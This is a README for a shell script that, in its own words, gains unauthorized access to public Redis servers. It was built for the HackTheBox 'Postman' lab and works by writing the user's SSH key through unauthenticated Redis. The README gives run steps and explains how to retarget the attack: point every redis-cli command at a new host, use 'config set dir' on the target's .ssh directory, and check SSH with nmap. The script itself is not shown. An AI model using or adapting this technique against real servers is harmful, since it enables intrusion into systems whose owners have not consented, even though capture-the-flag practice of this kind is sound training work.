# RedisUnauthorizedAccess


This script was created to to gain unauthorized access on public Redis servers. 


## Getting Started

First you will need to create a ssh key inside your machine and properly filling in all the required fields.




(1) Go to the ssh directory with 
```
cd .ssh 
```
(2) Create a new key 
```
ssh-keygen
```
(3) Run the script
```
sh script.sh
```

## Recommendations

This script was also created to automate all the steps required to obtain SSH access within the public Redis server in the HackTheBox.eu machine "Postman". Therefore, in a different situation, you will be required to change certain conditions according to the case within the script.


## Changes

(1) Change the remote host in every commands 
```
"redis-cli -h yourtargetremote" 
```
(2) Change correct directory pattern of your redis target
```
"redis-cli -h yourtargetremote config set dir /x/z/x/.ssh"
```
(3) And of course check if an authentication session is available through SSH
```
nmap -p 22 yourtargetremote
```
## Authors

* **Lorenzo Albano Fontanot** - *Initial work* - [Ezploisite](https://github.com/Ezploisite)


## Terms of use

* You are free to edit this script as you wish.
* Don't forget to let me know if the script was useful to you.
* Only for educational purpose.

## Acknowledgments

* Thanks if you'll choose to use this script.

## Special thanks

* KNX 
* Pozivo
* H1tman










